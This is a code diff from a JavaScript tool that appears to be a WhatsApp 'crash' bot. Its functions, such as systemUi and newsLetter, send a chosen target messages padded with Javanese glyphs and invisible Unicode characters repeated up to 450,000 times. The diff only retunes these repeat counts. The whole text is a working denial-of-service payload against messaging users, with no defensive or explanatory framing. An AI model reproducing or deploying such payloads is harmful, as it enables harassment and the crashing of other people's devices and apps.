@@ -2044,7 +2044,7 @@ async function systemUi(target, Ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "Please.." + "ꦾ".repeat(90000) + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(5111)
+                        text: "Please.." + "ꦾ".repeat(450000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -2272,7 +2272,7 @@ async function newsLetter(target, Ptcp = true) {
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Maaf Kak" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(5555),
+                conversation: "Maaf Kak" + "ꦾ".repeat(300000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
@@ -2306,7 +2306,7 @@ async function newsLetter(target, Ptcp = true) {
         target,
         {
           extendedTextMessage: {
-            text: "Wanna With Yours :)" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(7777),
+            text: "Wanna With Yours :)" + "ꦾ".repeat(250000),
             contextInfo: {
               stanzaId: "1234567890ABCDEF",
               participant: "0@s.whatsapp.net",
@@ -2415,13 +2415,13 @@ async function newsLetter(target, Ptcp = true) {
         target,
         {
           extendedTextMessage: {
-            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(140000),
+            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(100000),
             contextInfo: {
               fromMe: false,
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(150000),
+                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(300000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
